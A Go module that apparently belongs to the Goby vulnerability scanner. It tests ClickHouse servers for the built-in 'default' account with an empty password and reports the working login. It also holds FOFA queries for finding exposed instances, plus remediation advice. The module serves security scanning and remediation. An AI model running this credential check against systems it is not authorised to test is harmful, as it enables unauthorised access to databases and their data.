package exploits

import (
	"fmt"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "ClickHouse Default Password",
    "Description": "<p>ClickHouse is a high-performance, column-oriented SQL database management system (DBMS) for online analytical processing (OLAP). It is available both as open source software and as a cloud service..  Default web client credentials were discovered.</p>",
    "Product": "ClickHouse",
    "Homepage": "https://clickhouse.com/",
    "DisclosureDate": "2022-02-23",
    "Author": "2826161446@qq.com",
    "FofaQuery": "(header=\"ClickHouse\" && body=\"ok\") || body=\"loader.tabix.io/master.js\"",
    "GobyQuery": "(header=\"ClickHouse\" && body=\"ok\") || body=\"loader.tabix.io/master.js\"",
    "Level": "2",
    "Impact": "<p>Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.</p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "default",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password",
        "2H1W"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "ClickHouse 默认口令",
            "Product": "ClickHouse",
            "Description": "<p>ClickHouse 是一款高性能、面向列的 SQL 数据库管理系统 (DBMS)，用于联机分析处理 (OLAP)。它既可以作为&nbsp;开源软件，也可以作为&nbsp;云服务&nbsp;使用。该应用存在默认口令，攻击者可以登录该系统获取敏感信息。<br></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。<br></p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "ClickHouse Default Password",
            "Product": "ClickHouse",
            "Description": "<p>ClickHouse is a high-performance, column-oriented SQL database management system (DBMS) for online analytical processing (OLAP). It is available both as open source software and as a cloud service..  Default web client credentials were discovered.<br></p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, and special characters, with more than 8 digits.<br></p><p>2. If not necessary, prohibit public network access to the system.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>Attackers can control the entire platform through default password vulnerabilities and use administrator privileges to operate core functions.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password",
                "2H1W"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2024-09-30",
    "Variables": {},
    "PocId": "9957"
}`

	//请求发送
	//注意：本函数传入的参数为hostInfo
	//注意：模板编写后务必全局替换后面随机字符AAAA, POC检测函数也需要同步修改
	sendPayloadyp2Vnbp5 := func(hostInfo *httpclient.FixUrl) (bool, string, string) {
		// 注意：返回的第一个值为bool值，若弱口令登录成功请返回true，否则返回false
		// 注意：vulPath是默认口令请求路径，请以 "/login" 的格式返回
		// 注意：vulInfo是默认口令，请以 "admin:123456" 的格式返回
		vulPath := `/?add_http_cors_header=1&log_queries=1&output_format_json_quote_64bit_integers=1&output_format_json_quote_denormals=1`
		vulInfo := ``
		userInfoList := []string{`default`}
		pwdInfoList := []string{``}

		for _, userInfo := range userInfoList {
			for _, pwdInfo := range pwdInfoList {
				postRequestConfig := httpclient.NewPostRequestConfig(vulPath + "&user=" + userInfo + "&password=" + pwdInfo)
				postRequestConfig.VerifyTls = false
				postRequestConfig.FollowRedirect = false
				postRequestConfig.Header.Store("Accept-Encoding", " gzip, deflate, br, zstd")
				postRequestConfig.Header.Store("Sec-Fetch-Mode", " cors")
				postRequestConfig.Header.Store("sec-ch-ua-mobile", " ?0")
				postRequestConfig.Header.Store("User-Agent", " Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36")
				postRequestConfig.Header.Store("Accept", " */*")
				postRequestConfig.Header.Store("Sec-Fetch-Site", " same-origin")
				postRequestConfig.Header.Store("Accept-Language", " zh-CN,zh;q=0.9")
				postRequestConfig.Header.Store("sec-ch-ua-platform", " \"Windows\"")
				postRequestConfig.Header.Store("sec-ch-ua", " \"Google Chrome\";v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"")
				postRequestConfig.Header.Store("Sec-Fetch-Dest", " empty")
				postRequestConfig.Header.Store("Content-Type", " application/x-www-form-urlencoded")

				postRequestConfig.Data = fmt.Sprintf("SELECT 'login success'\n\n FoRmAt JSON")
				//请求
				response, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
				if err != nil {
					return false, vulInfo, vulPath
				}
				if strings.Contains(response.RawBody, "'login success'\": \"login success") {
					vulInfo = userInfo + ":" + pwdInfo
					return true, vulInfo, vulPath
				}
			}
		}
		return false, vulInfo, vulPath
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
			respBool, vulInfo, vulPath := sendPayloadyp2Vnbp5(hostInfo)

			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			if respBool {
				ss.VulURL = hostInfo.Scheme() + "://" + vulInfo + "@" + hostInfo.HostInfo + vulPath
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可

			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			_, vulInfo, _ := sendPayloadyp2Vnbp5(expResult.HostInfo)
			expResult.Output = `Please use "` + vulInfo + `" to login`
			expResult.Success = true
			return expResult
		},
	))
}
